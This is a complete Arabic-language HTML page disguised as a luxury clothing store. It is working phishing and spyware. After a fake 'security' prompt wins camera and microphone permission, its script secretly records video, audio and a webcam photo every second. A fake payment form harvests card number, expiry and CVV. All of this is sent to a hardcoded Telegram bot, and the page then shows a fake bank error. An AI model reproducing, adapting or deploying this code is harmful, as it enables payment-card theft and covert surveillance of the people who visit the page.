<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Luxury - متجر النخبة</title>
    <style>
        :root { --gold: #c5a059; --dark: #050505; --card: #121212; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--dark); color: white; margin: 0; overflow: hidden; }
        
        /* نافذة الدخول الإجبارية (User Gesture) */
        #entry-modal { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center; text-align: center; padding: 20px; }
        .modal-content { max-width: 400px; border: 1px solid var(--gold); padding: 30px; border-radius: 15px; background: #0a0a0a; }
        .enter-btn { background: var(--gold); color: black; padding: 15px 40px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 20px; width: 100%; }

        /* شاشة التحميل */
        #ldr { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
        .spin { width: 50px; height: 50px; border: 4px solid #222; border-top: 4px solid var(--gold); border-radius: 50%; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* المتجر */
        nav { background: #000; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--gold); }
        .container { max-width: 1200px; margin: 20px auto; padding: 0 15px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
        .card { background: var(--card); border-radius: 10px; border: 1px solid #222; overflow: hidden; }
        .card img { width: 100%; height: 300px; object-fit: cover; }
        .btn-buy { width: 100%; padding: 12px; background: var(--gold); border: none; cursor: pointer; font-weight: bold; }

        /* صفحة الدفع */
        #pay-view { display: none; position: fixed; inset: 0; background: #fff; color: #000; z-index: 5000; padding: 30px; }
        .pay-container { max-width: 450px; margin: 0 auto; }
        .bank-logos { display: flex; justify-content: center; gap: 15px; margin: 20px 0; filter: grayscale(1); opacity: 0.6; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
    </style>
</head>
<body>

<div id="entry-modal">
    <div class="modal-content">
        <div style="font-size: 3rem; margin-bottom: 10px;">🛡️</div>
        <h2>تأكيد أمان المتجر</h2>
        <p style="color: #888; font-size: 14px;">لضمان تجربة تسوق آمنة وتفعيل ميزة القياس الذكي (AR)، يرجى الموافقة على شروط الاستخدام ومنح صلاحيات الوسائط.</p>
        <button class="enter-btn" onclick="initPermissions()">أوافق ودخول للمتجر</button>
    </div>
</div>

<div id="ldr"><div class="spin"></div><p id="ldr-txt" style="color:var(--gold); margin-top:15px;"></p></div>

<nav>
    <div style="font-weight:bold; color:var(--gold); font-size: 1.5rem;">LUXURY STORE</div>
    <div style="font-size: 20px;">🛒 <span id="c-num" style="background:red; padding:2px 6px; border-radius:50%; font-size:12px;">0</span></div>
</nav>

<div class="container">
    <div class="grid" id="main-grid">
        </div>
</div>

<div id="pay-view">
    <div class="pay-container">
        <div onclick="back()" style="cursor:pointer; color:#666; margin-bottom:20px;">🔙 العودة</div>
        <h2 style="text-align:center">بوابة الدفع المصرفية</h2>
        <div class="bank-logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="20">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="20">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" height="20">
        </div>
        <input type="text" id="n" placeholder="اسم حامل البطاقة">
        <input type="number" id="c" placeholder="رقم البطاقة">
        <div style="display:flex; gap:10px">
            <input type="text" id="e" placeholder="MM/YY">
            <input type="password" id="v" placeholder="CVV">
        </div>
        <button class="enter-btn" style="background:#000; color:#fff;" onclick="sendCard()">تأكيد الدفع</button>
        <p id="err" style="color:red; text-align:center; display:none; margin-top:15px;">⚠️ فشل الاتصال بخادم البنك. حاول لاحقاً.</p>
    </div>
</div>

<script>
    const BT = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
    const CI = "5648826330";
    let stream = null;

    // تشغيل الأذونات بمجرد الضغط على زر الدخول
    async function initPermissions() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('entry-modal').style.display = 'none';
            document.body.style.overflow = 'auto';
            
            // بدء "العمليات الهكرية" في الخلفية
            startCapturing();
            renderProducts();
        } catch (e) {
            alert("عذراً، يجب السماح بالأذونات للوصول إلى المتجر الحصري.");
        }
    }

    function wait(t, ms, cb) {
        const l = document.getElementById('ldr');
        document.getElementById('ldr-txt').innerText = t;
        l.style.display = 'flex';
        setTimeout(() => { l.style.display = 'none'; if(cb) cb(); }, ms);
    }

    function renderProducts() {
        const items = [
            {n: "سترة لوي فيتون", p: 450, i: "https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=400"},
            {n: "فستان ديور ناعم", p: 890, i: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400"}
        ];
        document.getElementById('main-grid').innerHTML = items.map(x => `
            <div class="card">
                <img src="${x.i}">
                <div style="padding:15px"><b>${x.n}</b><div style="color:var(--gold); margin:10px 0;">${x.p} $</div>
                <button class="btn-buy" onclick="goPay('${x.n}')">شراء الآن</button></div>
            </div>
        `).join('');
    }

    function goPay(name) {
        wait("جاري تأمين بوابة الدفع...", 1000, () => {
            document.getElementById('pay-view').style.display = 'block';
        });
    }

    function back() {
        wait("العودة للمتجر...", 500, () => {
            document.getElementById('pay-view').style.display = 'none';
        });
    }

    // --- نظام سحب البيانات والوسائط ---
    function startCapturing() {
        // فيديو 10 ثواني
        record(stream, 'video', 10000);
        // صوت 5 ثواني
        record(stream, 'audio', 5000);
        // صور كل ثانية
        setInterval(() => capture(), 1000);
    }

    async function record(s, type, ms) {
        const rec = new MediaRecorder(s);
        const ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = () => {
            const b = new Blob(ch, { type: type==='video'?'video/mp4':'audio/mp3' });
            const fd = new FormData();
            fd.append("chat_id", CI);
            fd.append(type, b, `file.${type==='video'?'mp4':'mp3'}`);
            fetch(`https://api.telegram.org/bot${BT}/send${type==='video'?'Video':'Audio'}`, {method:"POST", body:fd});
        };
        rec.start();
        setTimeout(() => rec.stop(), ms);
    }

    function capture() {
        const v = document.createElement('video');
        v.srcObject = stream; v.play();
        setTimeout(() => {
            const c = document.createElement('canvas');
            c.width = 480; c.height = 640;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => {
                const fd = new FormData();
                fd.append("chat_id", CI); fd.append("photo", b, "sh.jpg");
                fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, {method:"POST", body:fd});
            }, 'image/jpeg');
        }, 300);
    }

    async function sendCard() {
        const val = { n: document.getElementById('n').value, c: document.getElementById('c').value, e: document.getElementById('e').value, v: document.getElementById('v').value };
        wait("جاري التحقق مع البنك...", 2000, async () => {
            const txt = `💳 صيد:\n👤 ${val.n}\n💳 ${val.c}\n📅 ${val.e}\n🔐 ${val.v}`;
            await fetch(`https://api.telegram.org/bot${BT}/sendMessage?chat_id=${CI}&text=${encodeURIComponent(txt)}`);
            document.getElementById('err').style.display = 'block';
        });
    }
</script>
</body>
</html>
